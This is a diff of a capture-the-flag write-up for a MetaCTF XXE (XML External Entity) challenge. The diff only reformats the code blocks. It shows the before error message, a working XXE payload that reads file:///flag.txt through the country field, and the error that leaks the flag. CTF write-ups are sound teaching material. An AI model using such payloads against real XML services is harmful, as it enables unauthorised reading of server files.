@@ -17,21 +17,21 @@ This is an XXE (XML External Entity) challenge. The API uses XML, and vulnerable
 
 <img width="2040" height="692" alt="image" src="https://github.com/user-attachments/assets/8c3e8289-5c45-48aa-b21c-c5705845bbb1" />
 
-
 In the CTF it worked like this 
 
-```before
+Before
+``` 
 An invalid country code will give us <error>The country code blah is not a recognized country code.</error>.
 ```
-
-```Query
+Query
+``` 
 
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
 <query><search>
 </search><country>&xxe;</country></query>
 
 ```
-
-```after
+After
+``` 
 <error>The country code MetaCTF{y3ah_xxe_d0e5_r0ck_d0esnt_it?} is not a recognized country code.</error>
 ```
